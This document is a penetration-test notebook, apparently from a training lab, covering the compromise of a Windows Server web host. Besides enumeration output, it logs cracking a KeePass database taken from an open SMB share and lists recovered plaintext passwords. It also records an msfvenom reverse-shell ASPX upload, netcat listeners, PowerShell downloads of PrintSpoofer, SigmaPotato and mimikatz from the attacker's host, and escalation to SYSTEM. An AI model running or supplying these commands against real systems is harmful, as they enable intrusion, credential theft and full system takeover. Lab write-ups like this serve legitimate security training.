# 192.168.X.248
# Navigation
- [Summary](#summary)
- [Flags](#flags)
- [Accounts](#accounts)
- [Enumeration](#enumeration)
    - [NMAP](#nmap)
    - [Local Users](#local-users)
    - [Local Groups](#local-groups)
    - [System Info](#system-info)
    - [Routes](#routes)
    - [Netstat](#netstat)
    - [Environment Vars](#environment-vars)
    - [Domain Controller Info](#domain-controller-info)
- [Services](#services)
    - [API Endpoints](#api-endpoints)
- [Command History](#command-history)
# Summary
-
# Flags    
`Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`

- C:\Users\emma\Desktop\local.txt
- C:\Users\mark\Desktop\proof.txt
# Accounts
### nt authority\system
` connect via internet service below`
`drop sigmapotato and elevate`
`had to do it via reverse shell see sigmapotato --help`
### internet service / ...
`drop revshell.aspx via smb to \r14_2022\build\DNN\wwwroot\`
`start nc -lvnp 4444`
`make sure hosting shell.ps1 via pyton3 -m http.server 80`
`activate by navigating to http://192.168.203.248/revshell.aspx`   
`whoami /priv`
```
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```
`whoami /groups`
```
Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
```
# Enumeration
## NMAP
`sudo nmap -sV 192.168.152.248 --top-ports 1000`
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
`sudo nmap -sV --script vuln -p- 192.168.240.248`
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-fileupload-exploiter: 
    |   
    |_    Couldn't find a file-type field.
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    | http-enum: 
    |   /login.aspx: Possible admin folder
    |   /rss.aspx: RSS or Atom feed
    |   /login/: Login page
    |   /robots.txt: Robots file
    |_  /privacy/: Potentially interesting folder
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49965/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
    |_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)
    | vulners: 
    |   cpe:/a:microsoft:sql_server:2019: 
    |       DF707FE2-EC27-5541-BC6A-6C7A0E9CC454    8.8     https://vulners.com/githubexploit/DF707FE2-EC27-5541-BC6A-6C7A0E9CC454  *EXPLOIT*
    |       CVE-2023-38169  8.8     https://vulners.com/cve/CVE-2023-38169
    |       CVE-2023-21713  8.8     https://vulners.com/cve/CVE-2023-21713
    |       CVE-2023-21705  8.8     https://vulners.com/cve/CVE-2023-21705
    |       CVE-2021-1636   8.8     https://vulners.com/cve/CVE-2021-1636
    |       CVE-2023-36785  7.8     https://vulners.com/cve/CVE-2023-36785
    |       CVE-2023-36730  7.8     https://vulners.com/cve/CVE-2023-36730
    |       CVE-2023-36420  7.8     https://vulners.com/cve/CVE-2023-36420
    |       CVE-2023-36417  7.8     https://vulners.com/cve/CVE-2023-36417
    |       CVE-2023-32028  7.8     https://vulners.com/cve/CVE-2023-32028
    |       CVE-2023-32027  7.8     https://vulners.com/cve/CVE-2023-32027
    |       CVE-2023-32026  7.8     https://vulners.com/cve/CVE-2023-32026
    |       CVE-2023-32025  7.8     https://vulners.com/cve/CVE-2023-32025
    |       CVE-2023-29356  7.8     https://vulners.com/cve/CVE-2023-29356
    |       CVE-2023-29349  7.8     https://vulners.com/cve/CVE-2023-29349
    |       CVE-2023-21718  7.8     https://vulners.com/cve/CVE-2023-21718
    |       CVE-2023-21704  7.8     https://vulners.com/cve/CVE-2023-21704
    |       CVE-2023-21528  7.8     https://vulners.com/cve/CVE-2023-21528
    |       CVE-2022-23276  7.8     https://vulners.com/cve/CVE-2022-23276
    |       CVE-2022-29143  7.5     https://vulners.com/cve/CVE-2022-29143
    |       CVE-2023-23384  7.3     https://vulners.com/cve/CVE-2023-23384
    |_      CVE-2023-36728  5.5     https://vulners.com/cve/CVE-2023-36728
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
```
`sudo nmap -A -T4 -p- 192.168.152.248`
```

```
## Local Users
`Get-LocalUser`
```
Name               Enabled Description                                                                                 
----               ------- -----------                                                                                 
Administrator      True    Built-in account for administering the computer/domain                                      
DefaultAccount     False   A user account managed by the system.                                                       
emma               True    Emma                                                                                        
Guest              True    Built-in account for guest access to the computer/domain                                    
mark               True    Mark (Local)                                                                                
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
```
## Local Groups
`Get-LocalGroup`
```
Name                                        Description                                                                
----                                        -----------                                                                
SQLServer2005SQLBrowserUser$WIN-PIFPPLOIHAP Members in the group have the required access and privileges to be assig...
Access Control Assistance Operators         Members of this group can remotely query authorization attributes and pe...
Administrators                              Administrators have complete and unrestricted access to the computer/domain
Backup Operators                            Backup Operators can override security restrictions for the sole purpose...
Certificate Service DCOM Access             Members of this group are allowed to connect to Certification Authoritie...
Cryptographic Operators                     Members are authorized to perform cryptographic operations.                
Device Owners                               Members of this group can change system-wide settings.                     
Distributed COM Users                       Members are allowed to launch, activate and use Distributed COM objects ...
Event Log Readers                           Members of this group can read event logs from local machine               
Guests                                      Guests have the same access as members of the Users group by default, ex...
Hyper-V Administrators                      Members of this group have complete and unrestricted access to all featu...
IIS_IUSRS                                   Built-in group used by Internet Information Services.                      
Network Configuration Operators             Members in this group can have some administrative privileges to manage ...
Performance Log Users                       Members of this group may schedule logging of performance counters, enab...
Performance Monitor Users                   Members of this group can access performance counter data locally and re...
Power Users                                 Power Users are included for backwards compatibility and possess limited...
Print Operators                             Members can administer printers installed on domain controllers            
RDS Endpoint Servers                        Servers in this group run virtual machines and host sessions where users...
RDS Management Servers                      Servers in this group can perform routine administrative actions on serv...
RDS Remote Access Servers                   Servers in this group enable users of RemoteApp programs and personal vi...
Remote Desktop Users                        Members in this group are granted the right to logon remotely              
Remote Management Users                     Members of this group can access WMI resources over management protocols...
Replicator                                  Supports file replication in a domain                                      
Storage Replica Administrators              Members of this group have complete and unrestricted access to all featu...
System Managed Accounts Group               Members of this group are managed by the system.                           
Users                                       Users are prevented from making accidental or intentional system-wide ch...

```
## System Info
`systeminfo`
```
Host Name:                 EXTERNAL
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00454-10000-00001-AA808
Original Install Date:     10/13/2022, 9:02:19 AM
System Boot Time:          3/28/2024, 10:04:09 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,625 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 3,273 MB
Virtual Memory: In Use:    1,526 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB5004330
                           [02]: KB5005039
                           [03]: KB5005552
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.203.248
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```
## Routes
`route print`
```
IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.203.254  192.168.203.248     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
    192.168.203.0    255.255.255.0         On-link   192.168.203.248    271
  192.168.203.248  255.255.255.255         On-link   192.168.203.248    271
  192.168.203.255  255.255.255.255         On-link   192.168.203.248    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link   192.168.203.248    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link   192.168.203.248    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0  192.168.203.254       1
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

```
## Netstat
`netstat -ano`
```
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       896
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       364
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       680
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       544
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1080
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1460
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       1708
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2172
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:49965          0.0.0.0:0              LISTENING       3200
  TCP    192.168.203.248:139    0.0.0.0:0              LISTENING       4
  TCP    192.168.203.248:445    192.168.45.214:46934   ESTABLISHED     4
  TCP    192.168.203.248:63245  192.168.45.214:4444    ESTABLISHED     2476
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       896
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       364
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       680
  TCP    [::]:49665             [::]:0                 LISTENING       544
  TCP    [::]:49666             [::]:0                 LISTENING       1080
  TCP    [::]:49667             [::]:0                 LISTENING       1460
  TCP    [::]:49668             [::]:0                 LISTENING       1708
  TCP    [::]:49669             [::]:0                 LISTENING       2172
  TCP    [::]:49670             [::]:0                 LISTENING       660
  TCP    [::]:49965             [::]:0                 LISTENING       3200
  UDP    0.0.0.0:123            *:*                                    2532
  UDP    0.0.0.0:500            *:*                                    2164
  UDP    0.0.0.0:3389           *:*                                    364
  UDP    0.0.0.0:4500           *:*                                    2164
  UDP    0.0.0.0:5353           *:*                                    1452
  UDP    0.0.0.0:5355           *:*                                    1452
  UDP    0.0.0.0:53214          *:*                                    1452
  UDP    0.0.0.0:59466          *:*                                    1452
  UDP    127.0.0.1:59950        127.0.0.1:59950                        2272
  UDP    192.168.203.248:137    *:*                                    4
  UDP    192.168.203.248:138    *:*                                    4
  UDP    [::]:123               *:*                                    2532
  UDP    [::]:500               *:*                                    2164
  UDP    [::]:3389              *:*                                    364
  UDP    [::]:4500              *:*                                    2164
  UDP    [::]:53214             *:*                                    1452
  UDP    [::]:59466             *:*                                    1452
```
## Environment Vars
`Get-ChildItem Env:`
```
Name                           Value                                                                                   
----                           -----                                                                                   
ALLUSERSPROFILE                C:\ProgramData                                                                          
APP_POOL_CONFIG                C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config                           
APP_POOL_ID                    DefaultAppPool                                                                          
APPDATA                        C:\Windows\system32\config\systemprofile\AppData\Roaming                                
AppKey                         !8@aBRBYdb3!                                                                            
CommonProgramFiles             C:\Program Files\Common Files                                                           
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files                                                     
CommonProgramW6432             C:\Program Files\Common Files                                                           
COMPUTERNAME                   EXTERNAL                                                                                
ComSpec                        C:\Windows\system32\cmd.exe                                                             
DriverData                     C:\Windows\System32\Drivers\DriverData                                                  
LOCALAPPDATA                   C:\Windows\system32\config\systemprofile\AppData\Local                                  
NUMBER_OF_PROCESSORS           2                                                                                       
OS                             Windows_NT                                                                              
Path                           C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPo...
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL                              
PROCESSOR_ARCHITECTURE         AMD64                                                                                   
PROCESSOR_IDENTIFIER           AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD                                        
PROCESSOR_LEVEL                23                                                                                      
PROCESSOR_REVISION             0102                                                                                    
ProgramData                    C:\ProgramData                                                                          
ProgramFiles                   C:\Program Files                                                                        
ProgramFiles(x86)              C:\Program Files (x86)                                                                  
ProgramW6432                   C:\Program Files                                                                        
PROMPT                         $P$G                                                                                    
PSExecutionPolicyPreference    Bypass                                                                                  
PSModulePath                   WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\syste...
PUBLIC                         C:\Users\Public                                                                         
SystemDrive                    C:                                                                                      
SystemRoot                     C:\Windows                                                                              
TEMP                           C:\Windows\TEMP                                                                         
TMP                            C:\Windows\TEMP                                                                         
USERDOMAIN                     WORKGROUP                                                                               
USERNAME                       EXTERNAL$                                                                               
USERPROFILE                    C:\Windows\system32\config\systemprofile                                                
windir                         C:\Windows  
```
## Domain Controller Info
`nltest /dsgetdc:relia`
```

```
# Services 
## Robots
```
# Begin robots.txt file
#/-----------------------------------------------\
#| In single portal/domain situations, uncomment the sitmap line and enter domain name
#\-----------------------------------------------/
#Sitemap: http://www.DomainNamehere.com/sitemap.aspx

User-agent: *
Disallow: /*/ctl/               # Googlebot permits *
Disallow: /admin/
Disallow: /App_Browsers/
Disallow: /App_Code/
Disallow: /App_Data/
Disallow: /App_GlobalResources/
Disallow: /bin/
Disallow: /Components/
Disallow: /Config/
Disallow: /contest/
Disallow: /controls/
Disallow: /Documentation/
Disallow: /HttpModules/
Disallow: /Install/
Disallow: /Providers/
Disallow: /Activity-Feed/userId/        # Do not index user profiles

# End of robots.txt file  
```   
## API Endpoints
`gobuster dir -u http://192.168.159.121:80 -w /usr/share/wordlists/dirb/big.txt -p pattern`
```

```
## SMB Shares
```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        transfer        Disk      
        Users           Disk      
```
# Command History
```c
    // Get SMB shares
    smbclient -L //192.168.140.248 -N
    // Attempt connect to SMB share transfer
    smbclient //192.168.140.248/transfer -N
    smb -> ls
    // Found files
    // "\DB-back\New Folder (2)\Emma\*"
    // "DB-back (1)\New Folder\Emma\Documents\Database.kdbx"
    //Pull back KeePass database
    smb -> get Database.kdbx
    // convert to john hash
    keepass2john Database.kdbx > database.hash
    // Attempt to crack with rockyou
    john database.hash --wordlist=/usr/share/wordlists/rockyou.txt
    // Cracked -> welcome1
    sudo apt install keepassxc
    // OR
    sudo apt install kpcli
    // FOUND username bo password Luigi=Papal1963

    //trying sqlmap
    sqlmap -u "http://192.168.140.248/login.aspx?username=test&password=test" --risk=3 --level=5 --technique=BEUSTQ

    // emma 
    // reverse shell thru web folder
    // r142022 dnn www root folder
    // aspx reverse shell 
    // ip-file in url to execute
    msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=4444 -f aspx > shell.aspx
    // in smb connection
    put shell.aspx
    // using metasploit
    // msfconsole
    // use exploit/multi/handler
    // set PAYLOAD windows/meterpreter/reverse_tcp
    // set LHOST 192.168.45.214
    // set LPORT 4444
    // run

    // create revshell.aspx -> downloads shell.ps1 from kali
    // create shell.ps1 -> creates reverse shell to nc -nvlp 4444

    // FOUND possible password in env vars: AppKey   !8@aBRBYdb3!
    // Upload printspoofer for priv esc
    powershell -c "Invoke-WebRequest -Uri http://192.168.45.214/tools/PrintSpoofer64.exe -OutFile PrintSpoofer64.exe"
    powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.45.214/tools/PrintSpoofer64.exe','PrintSpoofer.exe')"
    // in C:\transfer
    ./PrintSpoofer64.exe -i -c cmd.exe
    // fail
    powershell -c "Invoke-WebRequest -Uri http://192.168.45.214/tools/SigmaPotato.exe -OutFile SigmaPotato.exe"

    // kali
    nc -nvlp 4445
    PS C:\Windows\Temp> ./SigmaPotato.exe --revshell 192.168.45.214 4445
    // very slow but worked this way
    whoami
    // nt authority\system
    powershell -c "Invoke-WebRequest -Uri http://192.168.45.214/tools/mimikatz.exe -OutFile mimikatz.exe"
```
